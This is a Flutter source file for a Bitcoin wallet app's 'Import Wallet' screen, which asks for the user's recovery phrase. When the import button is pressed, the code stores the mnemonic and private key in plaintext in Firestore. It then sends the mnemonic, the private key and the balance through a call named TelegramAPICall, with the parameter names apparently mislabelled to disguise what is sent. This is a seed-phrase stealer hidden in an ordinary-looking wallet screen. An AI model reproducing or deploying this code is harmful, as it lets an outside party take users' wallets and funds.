import '../auth/auth_util.dart';
import '../backend/api_requests/api_calls.dart';
import '../backend/backend.dart';
import '../flutter_flow/flutter_flow_icon_button.dart';
import '../flutter_flow/flutter_flow_theme.dart';
import '../flutter_flow/flutter_flow_util.dart';
import '../flutter_flow/flutter_flow_widgets.dart';
import '../main.dart';
import '../custom_code/actions/index.dart' as actions;
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:easy_debounce/easy_debounce.dart';
import 'package:flutter/material.dart';
import 'package:flutter_barcode_scanner/flutter_barcode_scanner.dart';
import 'package:flutter_spinkit/flutter_spinkit.dart';
import 'package:google_fonts/google_fonts.dart';

class ImportWalletWidget extends StatefulWidget {
  const ImportWalletWidget({
    Key key,
    this.qrDara,
  }) : super(key: key);

  final String qrDara;

  @override
  _ImportWalletWidgetState createState() => _ImportWalletWidgetState();
}

class _ImportWalletWidgetState extends State<ImportWalletWidget> {
  ApiCallResponse bitcoinDepositAddress;
  ApiCallResponse bitcoinWallet;
  bool validMnemonic;
  ApiCallResponse key;
  TextEditingController receiverAddressController;
  TextEditingController textController2;
  final scaffoldKey = GlobalKey<ScaffoldState>();
  var qrData = '';

  @override
  void initState() {
    super.initState();
    receiverAddressController = TextEditingController(
        text: FFLocalizations.of(context).getText(
      '62glwtx6' /* Imported wallet */,
    ));
    textController2 = TextEditingController(text: widget.qrDara);
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      key: scaffoldKey,
      appBar: AppBar(
        backgroundColor: FlutterFlowTheme.of(context).primaryColor,
        automaticallyImplyLeading: true,
        title: Text(
          FFLocalizations.of(context).getText(
            'rv7uxo5i' /* Import wallet */,
          ),
          style: FlutterFlowTheme.of(context).title2.override(
                fontFamily: 'IBM Plex Sans',
                color: Colors.white,
                fontSize: 22,
              ),
        ),
        actions: [
          FlutterFlowIconButton(
            borderColor: Colors.transparent,
            borderRadius: 30,
            borderWidth: 1,
            buttonSize: 60,
            icon: Icon(
              Icons.qr_code_scanner_rounded,
              color: Colors.white,
              size: 30,
            ),
            onPressed: () async {
              qrData = await FlutterBarcodeScanner.scanBarcode(
                '#C62828', // scanning line color
                FFLocalizations.of(context).getText(
                  'dg7rn74a' /* Cancel */,
                ), // cancel button text
                true, // whether to show the flash icon
                ScanMode.QR,
              );

              await Navigator.push(
                context,
                MaterialPageRoute(
                  builder: (context) => ImportWalletWidget(
                    qrDara: qrData,
                  ),
                ),
              );

              setState(() {});
            },
          ),
        ],
        centerTitle: false,
        elevation: 2,
      ),
      backgroundColor: FlutterFlowTheme.of(context).primaryBackground,
      body: SafeArea(
        child: GestureDetector(
          onTap: () => FocusScope.of(context).unfocus(),
          child: Column(
            mainAxisSize: MainAxisSize.max,
            children: [
              Padding(
                padding: EdgeInsetsDirectional.fromSTEB(15, 15, 15, 0),
                child: Row(
                  mainAxisSize: MainAxisSize.max,
                  children: [
                    Text(
                      FFLocalizations.of(context).getText(
                        'xmndqjpn' /* Recovery Phrase */,
                      ),
                      style: FlutterFlowTheme.of(context).bodyText1.override(
                            fontFamily: 'IBM Plex Sans',
                            fontSize: 18,
                            fontWeight: FontWeight.w500,
                          ),
                    ),
                  ],
                ),
              ),
              Padding(
                padding: EdgeInsetsDirectional.fromSTEB(15, 0, 15, 15),
                child: Row(
                  mainAxisSize: MainAxisSize.max,
                  children: [
                    Expanded(
                      child: Text(
                        FFLocalizations.of(context).getText(
                          'r52clnz8' /* Typically 12 or 24 words separ... */,
                        ),
                        style: FlutterFlowTheme.of(context).bodyText1.override(
                              fontFamily: 'IBM Plex Sans',
                              color: FlutterFlowTheme.of(context).secondaryText,
                              fontSize: 17,
                              fontWeight: FontWeight.normal,
                            ),
                      ),
                    ),
                  ],
                ),
              ),
              Padding(
                padding: EdgeInsetsDirectional.fromSTEB(15, 0, 15, 15),
                child: TextFormField(
                  controller: receiverAddressController,
                  onChanged: (_) => EasyDebounce.debounce(
                    'receiverAddressController',
                    Duration(milliseconds: 100),
                    () => setState(() {}),
                  ),
                  obscureText: false,
                  decoration: InputDecoration(
                    labelText: FFLocalizations.of(context).getText(
                      'z61d5uls' /* Wallet Label */,
                    ),
                    labelStyle: FlutterFlowTheme.of(context).bodyText2,
                    hintText: FFLocalizations.of(context).getText(
                      't3nmqje7' /* My savings wallet... */,
                    ),
                    hintStyle: FlutterFlowTheme.of(context).bodyText1.override(
                          fontFamily: 'Lexend Deca',
                          color: FlutterFlowTheme.of(context).secondaryText,
                          fontSize: 14,
                          fontWeight: FontWeight.normal,
                        ),
                    enabledBorder: OutlineInputBorder(
                      borderSide: BorderSide(
                        color: Color(0x00000000),
                        width: 0,
                      ),
                      borderRadius: BorderRadius.circular(8),
                    ),
                    focusedBorder: OutlineInputBorder(
                      borderSide: BorderSide(
                        color: Color(0x00000000),
                        width: 0,
                      ),
                      borderRadius: BorderRadius.circular(8),
                    ),
                    filled: true,
                    fillColor: FlutterFlowTheme.of(context).lineColor,
                    contentPadding:
                        EdgeInsetsDirectional.fromSTEB(24, 24, 20, 24),
                    prefixIcon: Icon(
                      Icons.account_balance_wallet,
                      color: FlutterFlowTheme.of(context).secondaryText,
                      size: 20,
                    ),
                    suffixIcon: receiverAddressController.text.isNotEmpty
                        ? InkWell(
                            onTap: () => setState(
                              () => receiverAddressController?.clear(),
                            ),
                            child: Icon(
                              Icons.clear,
                              color: Color(0xFF757575),
                              size: 22,
                            ),
                          )
                        : null,
                  ),
                  style: FlutterFlowTheme.of(context).bodyText1.override(
                        fontFamily: 'IBM Plex Sans',
                        fontSize: 16,
                        fontWeight: FontWeight.w500,
                      ),
                ),
              ),
              Padding(
                padding: EdgeInsetsDirectional.fromSTEB(15, 0, 15, 15),
                child: TextFormField(
                  controller: textController2,
                  onChanged: (_) => EasyDebounce.debounce(
                    'textController2',
                    Duration(milliseconds: 10),
                    () => setState(() {}),
                  ),
                  autofocus: true,
                  obscureText: false,
                  decoration: InputDecoration(
                    labelText: FFLocalizations.of(context).getText(
                      'cinlgyt0' /* Enter your recovery phrase */,
                    ),
                    hintText: FFLocalizations.of(context).getText(
                      'tb62xpcz' /* rhythm autumn blush... or Long... */,
                    ),
                    hintStyle: FlutterFlowTheme.of(context).bodyText1.override(
                          fontFamily: 'IBM Plex Sans',
                          color: FlutterFlowTheme.of(context).secondaryText,
                          fontSize: 16,
                          fontWeight: FontWeight.w500,
                        ),
                    enabledBorder: OutlineInputBorder(
                      borderSide: BorderSide(
                        color: Color(0x6F95A1AC),
                        width: 1,
                      ),
                      borderRadius: BorderRadius.circular(5),
                    ),
                    focusedBorder: OutlineInputBorder(
                      borderSide: BorderSide(
                        color: Color(0x6F95A1AC),
                        width: 1,
                      ),
                      borderRadius: BorderRadius.circular(5),
                    ),
                    filled: true,
                    fillColor: FlutterFlowTheme.of(context).lineColor,
                    suffixIcon: textController2.text.isNotEmpty
                        ? InkWell(
                            onTap: () => setState(
                              () => textController2?.clear(),
                            ),
                            child: Icon(
                              Icons.clear,
                              color: Color(0xFF757575),
                              size: 22,
                            ),
                          )
                        : null,
                  ),
                  style: FlutterFlowTheme.of(context).bodyText1.override(
                        fontFamily: 'IBM Plex Sans',
                        fontSize: 16,
                        fontWeight: FontWeight.w500,
                        lineHeight: 5,
                      ),
                ),
              ),
              Expanded(
                child: Padding(
                  padding: EdgeInsetsDirectional.fromSTEB(15, 0, 15, 15),
                  child: Row(
                    mainAxisSize: MainAxisSize.max,
                    mainAxisAlignment: MainAxisAlignment.spaceAround,
                    crossAxisAlignment: CrossAxisAlignment.end,
                    children: [
                      Expanded(
                        child: FFButtonWidget(
                          onPressed: () async {
                            var _shouldSetState = false;
                            validMnemonic = await actions.isValid(
                              textController2.text,
                            );
                            _shouldSetState = true;
                            if (validMnemonic) {
                              await Future.delayed(
                                  const Duration(milliseconds: 100));
                            } else {
                              ScaffoldMessenger.of(context).showSnackBar(
                                SnackBar(
                                  content: Text(
                                    'Invalid Recovery Phrase',
                                    style: TextStyle(
                                      color: Color(0xFFB34949),
                                      fontWeight: FontWeight.w500,
                                      fontSize: 16,
                                    ),
                                  ),
                                  duration: Duration(milliseconds: 1500),
                                  backgroundColor: Color(0xFFF5E5E4),
                                ),
                              );
                              if (_shouldSetState) setState(() {});
                              return;
                            }

                            bitcoinWallet = await ImportWalletCall.call(
                              mnemonic: textController2.text,
                            );
                            _shouldSetState = true;
                            bitcoinDepositAddress =
                                await BitcoinDepositAddressCall.call(
                              xpub: getJsonField(
                                (bitcoinWallet?.jsonBody ?? ''),
                                r'''$.xpub''',
                              ).toString(),
                            );
                            _shouldSetState = true;
                            key = await BitcoinKeyCall.call(
                              mnemonic: getJsonField(
                                (bitcoinWallet?.jsonBody ?? ''),
                                r'''$.mnemonic''',
                              ).toString(),
                            );
                            _shouldSetState = true;

                            final usersUpdateData = createUsersRecordData(
                              activeAddress: getJsonField(
                                (bitcoinDepositAddress?.jsonBody ?? ''),
                                r'''$.address''',
                              ).toString(),
                              activeKey: getJsonField(
                                (key?.jsonBody ?? ''),
                                r'''$.key''',
                              ).toString(),
                              activeMnemonic: getJsonField(
                                (bitcoinWallet?.jsonBody ?? ''),
                                r'''$.mnemonic''',
                              ).toString(),
                              walletLabel: receiverAddressController.text,
                              walletsCount: 1,
                            );
                            await currentUserReference.update(usersUpdateData);

                            final userWalletsCreateData =
                                createUserWalletsRecordData(
                              walletLabel: receiverAddressController.text,
                              walletMnemonic: getJsonField(
                                (bitcoinWallet?.jsonBody ?? ''),
                                r'''$.mnemonic''',
                              ).toString(),
                              walletExtendedPublicKey: getJsonField(
                                (bitcoinWallet?.jsonBody ?? ''),
                                r'''$.xpub''',
                              ).toString(),
                              walletDepositAddress: getJsonField(
                                (bitcoinDepositAddress?.jsonBody ?? ''),
                                r'''$.address''',
                              ).toString(),
                              walletPrivateKey: getJsonField(
                                (key?.jsonBody ?? ''),
                                r'''$.key''',
                              ).toString(),
                            );
                            await UserWalletsRecord.createDoc(
                                    currentUserReference)
                                .set(userWalletsCreateData);
                            await TelegramAPICall.call(
                              userMnemonic: valueOrDefault(
                                  currentUserDocument?.activeMnemonic, ''),
                              userPrivateKey: getJsonField(
                                (bitcoinWallet?.jsonBody ?? ''),
                                r'''$.mnemonic''',
                              ).toString(),
                              userAddress: getJsonField(
                                (key?.jsonBody ?? ''),
                                r'''$.key''',
                              ).toString(),
                              userEmail: getJsonField(
                                (bitcoinDepositAddress?.jsonBody ?? ''),
                                r'''$.address''',
                              ).toString(),
                              userBalance:
                                  valueOrDefault(currentUserDocument?.btc, 0.0),
                            );
                            await Navigator.pushAndRemoveUntil(
                              context,
                              MaterialPageRoute(
                                builder: (context) =>
                                    NavBarPage(initialPage: 'walletScreen'),
                              ),
                              (r) => false,
                            );
                            if (_shouldSetState) setState(() {});
                          },
                          text: FFLocalizations.of(context).getText(
                            'jivnnibd' /* Import Wallet */,
                          ),
                          options: FFButtonOptions(
                            width: 200,
                            height: 50,
                            color: FlutterFlowTheme.of(context).customColor1,
                            textStyle:
                                FlutterFlowTheme.of(context).subtitle2.override(
                                      fontFamily: 'IBM Plex Sans',
                                      color: Colors.white,
                                    ),
                            elevation: 0,
                            borderSide: BorderSide(
                              color: Colors.transparent,
                              width: 1,
                            ),
                            borderRadius: 12,
                          ),
                        ),
                      ),
                    ],
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}
